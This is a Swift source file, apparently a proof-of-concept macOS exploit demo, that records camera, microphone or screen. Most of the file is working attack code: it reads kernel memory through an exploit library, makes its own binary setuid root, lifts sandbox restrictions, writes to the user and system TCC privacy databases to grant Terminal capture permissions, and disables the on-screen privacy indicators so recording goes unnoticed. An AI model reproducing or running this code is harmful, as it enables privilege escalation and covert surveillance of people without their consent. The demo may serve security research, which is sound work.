
import Foundation
import AVFoundation


enum VideoInputSource : String {
    case camera
    case screen
    case none
}


enum AudioInputSource : String {
    case mic
    case none
}


enum CaptureError: Error {
    case noMic
    case badMic
    case micNotAllowed
    case noCamera
    case cameraNotAllowed
    case badCamera
    case outputFileExist
    case timedOut
}


enum CaptureState: Equatable {
    case intialized
    case started
    case stopped
    case error
}


class CaptureSession: NSObject, ObservableObject {
    
    let session = AVCaptureSession()
    let output = AVCaptureMovieFileOutput()
    let outputFile: URL
    
    @Published var state = CaptureState.intialized
    
    init(video: VideoInputSource, audio: AudioInputSource, output: URL) throws {
        outputFile = output
        super.init()
        session.beginConfiguration()
        try configureAudio(audio: audio)
        try configureVideo(video: video)
        try configureOutput()
        session.commitConfiguration()
    }
}


// MARK: Authorization
extension CaptureSession {
    private func checkAuthorization(for mediaType: AVMediaType) -> Bool {
        let status = AVCaptureDevice.authorizationStatus(for: mediaType)
        var authorized = false
        switch status {
        case .restricted, .denied, .notDetermined:
            authorized = false
        case .authorized:
            authorized = true
        @unknown default:
            fatalError()
        }
        return authorized
    }
}


// MARK: Audio
extension CaptureSession {
    private func configureAudio(audio: AudioInputSource) throws {
        switch audio {
        case .mic:
            try self.configureMic()
        case .none:
            break
        }
    }
    
    private func configureMic() throws {
        guard let audioDevice = AVCaptureDevice.default(for: .audio) else {
            throw CaptureError.noMic
        }
        
        guard checkAuthorization(for: .audio) else {
            throw CaptureError.micNotAllowed
        }
        
        guard let audioInput = try? AVCaptureDeviceInput(device: audioDevice) else {
            throw CaptureError.badMic
        }
        
        if (!session.canAddInput(audioInput)) {
            fatalError("cannot add input to session")
        }
        
        session.addInput(audioInput)
    }
}


// MARK: Video
extension CaptureSession {
    private func configureVideo(video: VideoInputSource) throws {
        switch video {
        case .camera:
            try self.configureCamera()
        case .screen:
            try self.configureScreen()
        case .none:
            break
        }
    }
    
    private func configureCamera() throws {
        guard let cameraDevice = AVCaptureDevice.default(for: .video) else {
            throw CaptureError.noCamera
        }
        
        guard checkAuthorization(for: .video) else {
            throw CaptureError.cameraNotAllowed
        }
        
        guard let cameraInput = try? AVCaptureDeviceInput(device: cameraDevice) else {
            throw CaptureError.badCamera
        }
        
        if (!session.canAddInput(cameraInput)) {
            fatalError("cannot add input to session")
        }
        
        session.addInput(cameraInput)
    }
    
    private func configureScreen() throws {
        let screenInput = AVCaptureScreenInput()
        
        if (!session.canAddInput(screenInput)) {
            fatalError("cannot add input to session")
        }
        
        session.addInput(screenInput)
    }
}

// MARK: Output
extension CaptureSession {
    private func configureOutput() throws {
        if (!session.canAddOutput(output)) {
            fatalError("cannot add output to session")
        }
        
        session.addOutput(output)
    }
}

// MARK: Output monitoring
extension CaptureSession: AVCaptureFileOutputRecordingDelegate {
    func fileOutput(_ output: AVCaptureFileOutput, didStartRecordingTo fileURL: URL, from connections: [AVCaptureConnection]) {
        state = .started
    }
    
    func fileOutput(_ output: AVCaptureFileOutput, didPauseRecordingTo fileURL: URL, from connections: [AVCaptureConnection]) {
        fatalError()
    }
    
    func fileOutput(_ output: AVCaptureFileOutput, didResumeRecordingTo fileURL: URL, from connections: [AVCaptureConnection]) {
        fatalError()
    }
    
    func fileOutput(_ output: AVCaptureFileOutput, willFinishRecordingTo fileURL: URL, from connections: [AVCaptureConnection], error: Error?) {
        if let _ = error {
            state = .error
        } else {
            state = .stopped
        }
    }
    
    func fileOutput(_ output: AVCaptureFileOutput, didFinishRecordingTo outputFileURL: URL, from connections: [AVCaptureConnection], error: Error?) {
        debugPrint("file output stopped")
    }
}

// MARK: Controls
extension CaptureSession {
    func start() throws {
        assert(state == .intialized)
        session.startRunning();
        output.startRecording(to: outputFile, recordingDelegate: self)
        let newState = try waitForStateChange(from: .intialized, timeout: DispatchTime.distantFuture)
        assert(newState == .started)
    }
    
    func stop() throws {
        let current = self.state
        assert(current == .started)
        session.stopRunning()
        output.stopRecording()
        _ = try waitForStateChange(from: current, timeout: DispatchTime.now().advanced(by: .seconds(2)))
    }
    
    private func waitForStateChange(from: CaptureState, timeout: DispatchTime) throws -> CaptureState {
        let sem = DispatchSemaphore(value: 0)
        
        var currentState: CaptureState = self.state
        let cancellable = self.$state.sink() { newState in
            if newState != from {
                currentState = newState
                sem.signal()
            }
        }
        
        if currentState == from {
            let res = sem.wait(timeout: timeout)
            if res == .timedOut {
                throw CaptureError.timedOut
            }
        }
        
        cancellable.cancel()
        return currentState
    }
}


// MARK: - Privilege escalation
enum CommandError: Error {
    case status(Int)
    case error(Int)
}

func sudoRun(_ util: xpl_sudo_t, cmd: String, args: [String]) throws {
    var argArray = args.map { UnsafePointer<Int8>(strdup($0)) }
    defer { argArray.forEach { $0?.deallocate() } }
    
    let res = xpl_sudo_run(util, cmd, &argArray, argArray.count)
    
    if res != 0 {
        throw CommandError.status(Int(res))
    }
}


func fixBinaryPrivilege() throws {
    let binary = Bundle.main.executablePath!
    
    xpl_msdosfs_loadkext()
    var sudo = xpl_sudo_create()
    defer { xpl_sudo_destroy(&sudo) }
    
    print("[I] changing owner to root")
    try sudoRun(sudo!, cmd: "/usr/sbin/chown", args: ["-n", "0:0", binary])
    
    print("[I] enabling setuid")
    try sudoRun(sudo!, cmd: "/bin/chmod", args: ["4755", binary])
}

func relaunch() throws {
    let binary = Bundle.main.executablePath
    var pid: pid_t = 0
    
    var error = posix_spawn(&pid, binary, nil, nil, CommandLine.unsafeArgv, nil)
    guard error == 0 else {
        throw CommandError.error(Int(error))
    }
    
    var stat_loc: Int32 = -1
    repeat {
        error = waitpid(pid, &stat_loc, 0)
    } while error == EINTR || (error == 0 && (stat_loc & 0177) != 0)
}


// MARK: - Utils

func findParentTerminalProcess() throws -> uintptr_t {
    var cursor: uintptr_t = xpl_proc_current_proc()
    while cursor != 0 {
        let pid = xpl_kmem_read_uint32(cursor, Int(TYPE_PROC_MEM_P_PID_OFFSET))
        
        let binary_path = String(unsafeUninitializedCapacity: Int(PATH_MAX)) { ptr in
            return Int(proc_pidpath(Int32(pid), ptr.baseAddress!, UInt32(PATH_MAX)))
        }
        
        if binary_path == "/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal" {
            return cursor
        }
        
        let next = xpl_kmem_read_ptr(cursor, Int(TYPE_PROC_MEM_P_PPTR_OFFSET))
        if next != cursor {
            cursor = next
        } else {
            cursor = 0
        }
    }
    throw POSIXError(.ENOENT)
}


// MARK: - Argument parsing

func printUsage() {
    print("[I] usage: demo_av [-k kmem_uds] [-v video_mode] [-a audio_mode] [-f] output_file")
    print("[I] \tkmem_uds: path to kmem server unix domain socket")
    print("[I] \tvideo_mode: one of [none, camera, screen], default: screen")
    print("[I] \taudio_mode: one of [none, mic], default: mic")
    print("[I] \tuse -f flag to force overwrite if output file already exist")
    print("[I] example usage: demo_av -v camera -a mic capture.mov")
}

var kmemSocket: String = XPL_DEFAULT_KMEM_SOCKET
var video = "screen"
var audio = "mic"
var overwrite = false

var ch: Int32 = 0
while true {
    ch = getopt(CommandLine.argc, CommandLine.unsafeArgv, "k:v:a:f")
    guard ch != -1 else {
        break
    }
    
    switch Character(Unicode.Scalar(UInt8(ch))) {
    case "k":
        kmemSocket = String(cString: optarg)
    case "v":
        video = String(cString: optarg)
    case "a":
        audio = String(cString: optarg)
    case "f":
        overwrite = true
    default:
        printUsage()
        exit(1)
    }
}

guard CommandLine.argc > optind else {
    print("[E] output file path required")
    printUsage()
    exit(1)
}

let path = CommandLine.arguments[Int(optind)]


// MARK: - Main

guard let video = VideoInputSource(rawValue: video) else {
    print("[E] invalid video mode \(video). Should be one of camera, screen or none")
    exit(1)
}

guard let audio = AudioInputSource(rawValue: audio) else {
    print("[E] invalid audio mode \(audio). Should be one of mic or none")
    exit(1)
}

if video == .none && audio == .none {
    print("[E] both video and audio is set to none")
    exit(1)
}

guard overwrite || !FileManager.default.fileExists(atPath: path) else {
    print("[E] output file \(path) already exist, use -f flag to force overwrite")
    exit(1)
}

if FileManager.default.fileExists(atPath: path) {
    do {
        try FileManager.default.removeItem(atPath: path)
    } catch {
        print("[E] failed to overwrite file \(path), err: \(error.localizedDescription)")
        exit(1)
    }
}

print("[I] initializing kmem")
xpl_init()
var kmem_backend: xpl_kmem_backend_t? = nil
var error = xpl_kmem_remote_client_create(kmemSocket, &kmem_backend)
guard error == 0 else {
    print("[E] cannot connect to kmem server unix domain socket \(kmemSocket), err:", String(cString: strerror(error)))
    exit(1)
}

xpl_kmem_use_backend(kmem_backend!)
let mach_execute_header = xpl_kmem_remote_client_get_mh_execute_header(kmem_backend)
xpl_slider_kernel_init(mach_execute_header)
defer { xpl_kmem_remote_client_destroy(&kmem_backend) }

guard let terminal_process = try? findParentTerminalProcess() else {
    print("[E] parent Terminal.app process not found. This demo must be run from /System/Applications/Utilities/Terminal.app")
    exit(1)
}

setuid(0)

guard getuid() == 0 else {
    do {
        print("[I] launched without root, obtaining root privilege")
        try fixBinaryPrivilege()
        print("[I] relaunching")
        try relaunch()
        exit(0)
    } catch {
        print("[E] failed to obtain root privilege, err:", error.localizedDescription)
        exit(1)
    }
}

let user_uid = xpl_kmem_read_uint32(terminal_process, Int(TYPE_PROC_MEM_P_UID_OFFSET))
let home_dir = String(cString: getpwuid(user_uid)!.pointee.pw_dir!)
let user_tcc_database = URL(fileURLWithPath: "Library/Application Support/com.apple.TCC/TCC.db", relativeTo: URL(fileURLWithPath: home_dir)).path
var system_tcc_database = "/Library/Application Support/com.apple.TCC/TCC.db"

print("[I] using user TCC database at", user_tcc_database)
print("[I] using system TCC database at", system_tcc_database)

print("[I] intializing sandbox utility")
var util_sandbox = xpl_sandbox_create()

print("[I] disabling sandbox FS restrictions")
xpl_sandbox_disable_fs_restrictions(util_sandbox!)

print("[I] authorizing com.apple.Terminal to use kTCCServiceMicrophone")
error = xpl_tcc_authorize(user_tcc_database, "com.apple.Terminal", "kTCCServiceMicrophone")
if error != 0 {
    print("[E] cannot send authorization to TCC.db, err:", error)
    xpl_sandbox_destroy(&util_sandbox)
    abort()
}

print("[I] authorizing com.apple.Terminal to use kTCCServiceCamera")
error = xpl_tcc_authorize(user_tcc_database, "com.apple.Terminal", "kTCCServiceCamera")
if error != 0 {
    print("[E] cannot send authorization to TCC.db, err:", error)
    xpl_sandbox_destroy(&util_sandbox)
    abort()
}

print("[I] authorizing com.apple.Terminal to use kTCCServiceScreenCapture")
error = xpl_tcc_authorize(system_tcc_database, "com.apple.Terminal", "kTCCServiceScreenCapture")
if error != 0 {
    print("[E] cannot send authorization to system TCC.db, err:", error)
    xpl_sandbox_destroy(&util_sandbox)
    abort()
}

print("[I] restoring sandbox FS restrictions")
xpl_sandbox_destroy(&util_sandbox)

print("[I] disabling privacy indicators")
var privacy_disable_session = privacy_disable_session_start()
defer {
    var sb = xpl_sandbox_create()
    xpl_sandbox_disable_signal_check(sb)
    print("[I] restoring privacy indicators")
    privacy_disable_session_stop(&privacy_disable_session)
    xpl_sandbox_destroy(&sb)
}

let stopSem = DispatchSemaphore(value: 0)

func stopSignalHandler(_: Int32) {
    print("\n[I] received stop signal")
    stopSem.signal()
}

do {
    let session = try CaptureSession(video: video, audio: audio, output: URL(fileURLWithPath: path))

    try session.start()
    signal(SIGINT, stopSignalHandler)
    
    let cancellable = session.$state.sink { state in
        if state == .error || state == .stopped {
            stopSem.signal()
        }
    }
    
    print("[I] recording started, press Ctrl-C to stop")
    stopSem.wait()
    cancellable.cancel()
    
    try session.stop()
    
    print("[I] recording saved to \(path)")
} catch CaptureError.badMic {
    print("[E] cannot open microphone")
} catch CaptureError.noMic {
    print("[E] no microphone present")
} catch CaptureError.micNotAllowed {
    print("[E] not authorized to use microphone")
} catch CaptureError.badCamera {
    print("[E] cannot open camera")
} catch CaptureError.noCamera {
    print("[E] no camera present")
} catch CaptureError.cameraNotAllowed {
    print("[E] not authorized to use camera")
} catch CaptureError.outputFileExist {
    print("[E] output file already exists")
} catch CaptureError.timedOut {
    print("[E] operation timed out")
}
